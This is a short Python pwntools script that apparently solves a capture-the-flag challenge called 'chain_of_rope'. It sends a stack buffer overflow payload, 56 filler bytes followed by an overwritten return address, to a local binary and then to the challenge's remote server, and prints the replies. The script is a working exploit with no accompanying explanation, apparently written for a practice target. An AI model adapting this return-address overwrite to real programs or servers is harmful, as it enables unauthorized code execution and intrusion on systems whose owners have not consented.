from pwn import *


payload = 'A'*56+'\x31\x12\x40\x00\x00\x00\x00\x00'

p=process('./chain_of_rope')
p=remote('shell.actf.co', 19400)
print p.recvuntil('ss')
p.sendline('1')
p.sendline(payload)
print p.recvline()
print p.recvline()
